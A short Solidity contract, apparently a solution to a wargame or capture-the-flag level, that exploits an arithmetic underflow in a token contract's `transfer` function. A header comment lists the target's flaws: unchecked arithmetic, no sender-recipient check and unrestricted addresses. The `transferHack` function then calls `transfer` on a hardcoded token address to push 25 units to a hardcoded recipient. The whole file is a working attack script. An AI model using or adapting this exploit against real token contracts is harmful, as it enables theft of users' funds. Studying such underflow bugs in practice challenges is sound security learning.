// SPDX-License-Identifier: MIT
pragma solidity >= 0.8.0;

/**
	Use the unchecked arithmetic operation in `transfer` function of contract
	to send value more than what should be allowed.
	There are multiple mistakes here:
	1. Arithmetic overflow and underflow check
	2. Checking if `_to` and `msg.sender` is same or not
	3. Can send to and from any address, not just owned
 */

interface Token {
	function transfer(address _to, uint _value) external returns (bool);
}

contract TokenHack {
	Token t = Token(0x804f5DdC712e9A263ef468F4811AE3ad2108dd05);

	function transferHack () public {
		uint256 maxNum = 25;
		t.transfer(0x40E42BF8e260458A5a8187da2dB1FA5Ff87239D3, maxNum);
	}
}